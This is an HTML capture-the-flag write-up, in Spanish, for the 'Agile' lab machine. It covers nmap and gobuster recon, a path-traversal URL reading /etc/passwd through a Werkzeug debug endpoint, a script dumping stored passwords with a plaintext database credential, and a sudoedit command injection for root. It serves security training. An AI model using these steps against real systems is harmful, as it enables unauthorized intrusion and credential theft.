@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <meta name="author" content="Alejandro García Peláez" />
+  <title>Agile Machine</title>
+  <script src="/src/translation.min.js" defer></script>
+  <style>
+    html {
+      line-height: 1.5;
+      font-family: Georgia, serif;
+      font-size: 14pt;
+      color: #1a1a1a;
+      background-color: #fdfdfd;
+    }
+    body {
+      margin: 0 auto;
+      max-width: 36em;
+      padding-left: 50px;
+      padding-right: 50px;
+      padding-top: 50px;
+      padding-bottom: 50px;
+      hyphens: auto;
+      overflow-wrap: break-word;
+      text-rendering: optimizeLegibility;
+      font-kerning: normal;
+    }
+    @media (max-width: 600px) {
+      body {
+        font-size: 0.9em;
+        padding: 1em;
+      }
+      h1 {
+        font-size: 1.8em;
+      }
+    }
+    @media print {
+      body {
+        background-color: transparent;
+        color: black;
+        font-size: 12pt;
+      }
+      p, h2, h3 {
+        orphans: 3;
+        widows: 3;
+      }
+      h2, h3, h4 {
+        page-break-after: avoid;
+      }
+    }
+    p {
+      margin: 1em 0;
+    }
+    a {
+      color: #1a1a1a;
+    }
+    a:visited {
+      color: #1a1a1a;
+    }
+    img {
+      max-width: 100%;
+    }
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.4em;
+    }
+    h5, h6 {
+      font-size: 1em;
+      font-style: italic;
+    }
+    h6 {
+      font-weight: normal;
+    }
+    ol, ul {
+      padding-left: 1.7em;
+      margin-top: 1em;
+    }
+    li > ol, li > ul {
+      margin-top: 0;
+    }
+    blockquote {
+      margin: 1em 0 1em 1.7em;
+      padding-left: 1em;
+      border-left: 2px solid #e6e6e6;
+      color: #606060;
+    }
+    code {
+      font-family: Menlo, Monaco, 'Lucida Console', Consolas, monospace;
+      font-size: 85%;
+      margin: 0;
+    }
+    pre {
+      margin: 1em 0;
+      overflow: auto;
+    }
+    pre code {
+      padding: 0;
+      overflow: visible;
+      overflow-wrap: normal;
+    }
+    .sourceCode {
+     background-color: transparent;
+     overflow: visible;
+    }
+    hr {
+      background-color: #1a1a1a;
+      border: none;
+      height: 1px;
+      margin: 1em 0;
+    }
+    table {
+      margin: 1em 0;
+      border-collapse: collapse;
+      width: 100%;
+      overflow-x: auto;
+      display: block;
+      font-variant-numeric: lining-nums tabular-nums;
+    }
+    table caption {
+      margin-bottom: 0.75em;
+    }
+    tbody {
+      margin-top: 0.5em;
+      border-top: 1px solid #1a1a1a;
+      border-bottom: 1px solid #1a1a1a;
+    }
+    th {
+      border-top: 1px solid #1a1a1a;
+      padding: 0.25em 0.5em 0.25em 0.5em;
+    }
+    td {
+      padding: 0.125em 0.5em 0.25em 0.5em;
+    }
+    header {
+      margin-bottom: 4em;
+      text-align: center;
+    }
+    #TOC li {
+      list-style: none;
+    }
+    #TOC ul {
+      padding-left: 1.3em;
+    }
+    #TOC > ul {
+      padding-left: 0;
+    }
+    #TOC a:not(:hover) {
+      text-decoration: none;
+    }
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    .sourceCode { overflow: visible; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        color: #aaaaaa;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+    div.sourceCode
+      {   }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+    code span.at { color: #7d9029; } /* Attribute */
+    code span.bn { color: #40a070; } /* BaseN */
+    code span.bu { color: #008000; } /* BuiltIn */
+    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #4070a0; } /* Char */
+    code span.cn { color: #880000; } /* Constant */
+    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+    code span.dt { color: #902000; } /* DataType */
+    code span.dv { color: #40a070; } /* DecVal */
+    code span.er { color: #ff0000; font-weight: bold; } /* Error */
+    code span.ex { } /* Extension */
+    code span.fl { color: #40a070; } /* Float */
+    code span.fu { color: #06287e; } /* Function */
+    code span.im { color: #008000; font-weight: bold; } /* Import */
+    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+    code span.op { color: #666666; } /* Operator */
+    code span.ot { color: #007020; } /* Other */
+    code span.pp { color: #bc7a00; } /* Preprocessor */
+    code span.sc { color: #4070a0; } /* SpecialChar */
+    code span.ss { color: #bb6688; } /* SpecialString */
+    code span.st { color: #4070a0; } /* String */
+    code span.va { color: #19177c; } /* Variable */
+    code span.vs { color: #4070a0; } /* VerbatimString */
+    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+  </style>
+</head>
+<body>
+<header id="title-block-header">
+<h1 class="title">Agile Machine</h1>
+<p class="author">Alejandro García Peláez</p>
+<p class="date">16-03-2023</p>
+
+<div id="buttons" style="display: grid; justify-content: center;">
+  <button class="spanish button-class" id="lang-en" type="button"> English </button>
+  <button class="english button-class" id="lang-es" type="button"> Español </button>
+</div>
+
+</header>
+<h2 id="reconocimiento">Reconocimiento</h2>
+<p>Comprobamos la disponibilidad de la máquina objetivo:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">ping</span> <span class="at">-c</span> 1 10.10.11.203</span></code></pre></div>
+<p><br></p>
+<pre><code>PING 10.10.11.203 (10.10.11.203) 56(84) bytes of data.
+64 bytes from 10.10.11.203: icmp_seq=1 ttl=63 time=44.9 ms
+
+--- 10.10.11.203 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 44.928/44.928/44.928/0.000 ms</code></pre>
+<p><strong>ttl-&gt;63</strong> Linux por proximidad.</p>
+<p>Lanzamos nmap para ver los servicios expuestos:</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">nmap</span> <span class="at">-p-</span> <span class="at">--open</span> <span class="at">-Pn</span> <span class="at">-n</span> <span class="at">-T5</span> 10.10.11.203 <span class="at">-oG</span> openTCPports</span></code></pre></div>
+<p><br></p>
+<pre><code>Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-24 18:47 CET
+Nmap scan report for 10.10.11.203
+Host is up (0.048s latency).
+Not shown: 65246 closed tcp ports (reset), 287 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 17.95 seconds</code></pre>
+<p>Extraemos los puertos del archivo mediante expresiones regulares:</p>
+<pre><code> grePorts</code></pre>
+<p><br></p>
+<pre><code> [!] Open ports: 22,80</code></pre>
+<p>Lanzamos los scripts de reconocimiento y versión de nmap para
+recopilar más información de los servicios expuestos:</p>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">nmap</span> <span class="at">-p22,80</span> <span class="at">-sVC</span> 10.10.11.203 <span class="at">-oN</span> servicesTCPports</span></code></pre></div>
+<p><br></p>
+<pre><code>Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-24 18:51 CET
+Nmap scan report for 10.10.11.203
+Host is up (0.046s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
+|_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://superpass.htb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds</code></pre>
+<p>Añadimos el dominio a nuestro archivo “/etc/hosts”.</p>
+<h2 id="obteniendo-acceso-a-la-máquina-víctima">Obteniendo acceso a la
+máquina víctima</h2>
+<p>Principalmente actuamos como si fueramos un usuario normal y vemos
+como funciona la aplicación, creamos nuestro usuario y guardamos algunas
+contraseñas; en paralelo dejamos trabajando gobuster para listar
+directorios:</p>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">gobuster</span> dir <span class="at">-b</span> 301,404 <span class="at">-w</span> /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt <span class="at">-u</span> http://superpass.htb</span></code></pre></div>
+<p>Tras un poco obtenemos:</p>
+<pre><code>===============================================================
+2023/03/24 20:47:50 Starting gobuster in directory enumeration mode
+===============================================================
+/download             (Status: 302) [Size: 249] [--&gt; /account/login?next=%2Fdownload]</code></pre>
+<p>Con unas contraseñas almacenadas y un usuario creado intentamos
+acceder:</p>
+<p><img src="images/agile1.png" /></p>
+<p>Obtenemos un error y vemos que Werkzeug está por detrás como
+WSGI.Echando un vistazo más detenidamente al error:</p>
+<p><img src="images/agile2.png" /></p>
+<p>Parece ser que hay un parametro que gestiona el fichero que hay que
+leer para descargar el csv asociado, lo que significa que podemos hacer
+lo siguiente para poder ver contenido de ficheros del sistema como
+“/etc/passwd” para ver posibles usuarios potenciales e intentar iniciar
+sesión en la aplicación.</p>
+<pre><code> http://superpass.htb/download?__debugger__=yes&amp;cmd=resource&amp;s=9Y5IGB4bxbF6x3mm6I4j&amp;fn=../etc/passwd</code></pre>
+<p>Nos descargamos el csv y podemos ver el contenido del archivo. Las
+líneas más relevantes son:</p>
+<pre><code>corum:x:1000:1000:corum:/home/corum:/bin/bash
+edwards:x:1002:1002::/home/edwards:/bin/bash
+dev_admin:x:1003:1003::/home/dev_admin:/bin/bash</code></pre>
+<p>Tres potenciales usuarios.</p>
+<p>Una vez ganado LFI podemos generar el PIN para acceder a la consola
+“debug” del servicio web. Hay múltiples recursos en la web; yo en
+concreto me he basado en el siguiente: <a
+href="https://www.bengrewell.com/2023/03/11/cracking-flask-werkzeug-console-pin/">enlace</a>.</p>
+<p>Una vez en la consola de desarrollo podemos ejecutar comandos en la
+máquina objetivo, por lo que entablamos una reverse shell.</p>
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+<h3 id="sqlalchemy-usuario-corum">SQLalchemy: usuario Corum</h3>
+<p>Ya dentro del equipo podemos echar un vistazo a los archivos de una
+forma más eficiente. Hay un archivo de configuración en json con
+credenciales para la BBDD. Creamos el siguiente script y usamos esta
+información:</p>
+<div class="sourceCode" id="cb13"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> sqlalchemy <span class="im">import</span> create_engine</span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>engine <span class="op">=</span> create_engine(<span class="st">&quot;mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass&quot;</span>)</span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a>cols <span class="op">=</span> [<span class="st">&quot;username&quot;</span>,<span class="st">&quot;password&quot;</span>,<span class="st">&quot;url&quot;</span>]</span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> c <span class="kw">in</span> cols:</span>
+<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a>  result <span class="op">=</span> engine.execute(<span class="st">&#39;SELECT </span><span class="sc">%s</span><span class="st"> FROM passwords;&#39;</span> <span class="op">%</span> c)</span>
+<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a>  <span class="bu">print</span>(<span class="st">&quot;</span><span class="sc">%s</span><span class="st">: ================================= &quot;</span> <span class="op">%</span> c)</span>
+<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a>  <span class="cf">for</span> e <span class="kw">in</span> result:</span>
+<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(e)</span></code></pre></div>
+<p>¿Cómo podemos saber las columnas y el nombre de la tabla? Echando un
+vistazo a los archivos del servicio, en “passwords.py”:</p>
+<p><img src="images/agile4.png" /></p>
+<p>Y obtenemos:</p>
+<p><img src="images/agile3.png" /></p>
+<h3 id="chrome-remote-debug-port-usuario-edward">Chrome Remote Debug
+Port: Usuario Edward</h3>
+<p>Una vez conectados a través de ssh, echando un vistazo a los archivos
+del sistema, veo que chrome está instalado (<code>ls -la /opt</code>) lo
+que no suele ser común en estas máquinas.</p>
+<p>Si observamos los procesos:</p>
+<p><img src="images/agile5.png" /></p>
+<p><img src="images/agile6.png" /></p>
+<p>Para poder acceder desde nuestro equipo hacemos “port forwarding””
+vía ssh y accediendo a Chrome:</p>
+<p><img src="images/agile7.png" /></p>
+<p>Inspeccionando la página:</p>
+<p><img src="images/agile8.png" /></p>
+<h3 id="sudoedit-root">Sudoedit: root</h3>
+<p>Ya desde Edwards como dev_admin podemos ejecutar:</p>
+<p><img src="images/agile9.png" /></p>
+<p>Como versión de sudo tenemos la 1.9.9, por lo que podemos usar la
+siguiente vulnerabilidad para escribir algún fichero extra:</p>
+<p><img src="images/agile10.png" /></p>
+<p>Vemos los ficheros que podemos editar ya sea como usuario o
+grupo:</p>
+<div class="sourceCode" id="cb14"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">find</span> / <span class="at">-user</span> dev_admin <span class="dv">2</span><span class="op">&gt;</span> /dev/null</span></code></pre></div>
+<p><br></p>
+<pre><code>/home/dev_admin
+/app/app-testing/tests/functional/creds.txt
+/app/config_test.json
+/app/config_prod.json</code></pre>
+<p><br></p>
+<div class="sourceCode" id="cb16"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">find</span> / <span class="at">-group</span> dev_admin <span class="dv">2</span><span class="op">&gt;</span> /dev/null</span></code></pre></div>
+<p><br></p>
+<pre><code>/home/dev_admin
+/app/venv
+/app/venv/bin
+/app/venv/bin/activate
+/app/venv/bin/Activate.ps1
+/app/venv/bin/activate.fish
+/app/venv/bin/activate.csh</code></pre>
+<p>Buscando si se ejecuta algún proceso que implique alguno de estos
+archivos:</p>
+<div class="sourceCode" id="cb18"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">ps</span> aux <span class="kw">|</span> <span class="fu">grep</span> venv</span></code></pre></div>
+<p>Nos devuelve que se está ejecutando “pytest”. Recordando un fichero
+anterior de actualización:</p>
+<p><img src="images/agile11.png" /></p>
+<p>De alguna forma root debe ejecutar
+<code>source /app/venv/bin/activate</code> para poder ejecutar el test,
+por lo que aprovechando esto:</p>
+<div class="sourceCode" id="cb19"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">sudo</span> <span class="at">-u</span> dev_admin EDITOR=<span class="st">&#39;vim -- /app/venv/bin/activate&#39;</span> sudoedit /app/config_test.json</span></code></pre></div>
+<p>Damos permisos SUID:</p>
+<p><img src="images/agile12.png" /></p>
+<p>Y con esto finalizamos la máquina y obtenemos permisos de
+administrador.</p>
+</body>
+</html>
+
+<style>
+
+html{
+  background-color: #f5f5fa;
+}
+
+body{
+  background-color: white;
+  box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+}
+
+.hidden{
+  display: none
+}
+
+.block{
+  display: block;
+}
+
+h1{
+  font-size: 19pt;
+}
+
+h2{
+  font-size: 16pt;
+}
+
+h3{
+  font-size: 14pt;
+}
+
+.button-class{
+  cursor: pointer;
+  --tw-border-opacity: 1;
+  border-color: rgb(0 0 0 / var(--tw-border-opacity));
+  border-width: 2px;
+  margin-top: 0.5rem;
+  background-color: transparent;
+  background-image: none;
+  font-family: inherit;
+  font-feature-settings: inherit;
+  font-variation-settings: inherit;
+  font-size: 100%;
+  font-weight: inherit;
+  line-height: inherit;
+  color: inherit;
+  --tw-border-spacing-x: 0;
+  --tw-border-spacing-y: 0;
+  --tw-translate-x: 0;
+  --tw-translate-y: 0;
+  --tw-rotate: 0;
+  --tw-skew-x: 0;
+  --tw-skew-y: 0;
+  --tw-scale-x: 1;
+  --tw-scale-y: 1;
+  --tw-pan-x: ;
+  --tw-pan-y: ;
+  --tw-pinch-zoom: ;
+  --tw-scroll-snap-strictness: proximity;
+  --tw-gradient-from-position: ;
+  --tw-gradient-via-position: ;
+  --tw-gradient-to-position: ;
+  --tw-ordinal: ;
+  --tw-slashed-zero: ;
+  --tw-numeric-figure: ;
+  --tw-numeric-spacing: ;
+  --tw-numeric-fraction: ;
+  --tw-ring-inset: ;
+  --tw-ring-offset-width: 0px;
+  --tw-ring-offset-color: #fff;
+  --tw-ring-color: rgb(59 130 246 / 0.5);
+  --tw-ring-offset-shadow: 0 0 #0000;
+  --tw-ring-shadow: 0 0 #0000;
+  --tw-shadow: 0 0 #0000;
+  --tw-shadow-colored: 0 0 #0000;
+  --tw-blur: ;
+  --tw-brightness: ;
+  --tw-contrast: ;
+  --tw-grayscale: ;
+  --tw-hue-rotate: ;
+  --tw-invert: ;
+  --tw-saturate: ;
+  --tw-sepia: ;
+  --tw-drop-shadow: ;
+  --tw-backdrop-blur: ;
+  --tw-backdrop-brightness: ;
+  --tw-backdrop-contrast: ;
+  --tw-backdrop-grayscale: ;
+  --tw-backdrop-hue-rotate: ;
+  --tw-backdrop-invert: ;
+  --tw-backdrop-opacity: ;
+  --tw-backdrop-saturate: ;
+  --tw-backdrop-sepia: ;
+  border-style: solid;
+  box-sizing: border-box;
+  --tw-bg-opacity: 1;
+}
+</style>
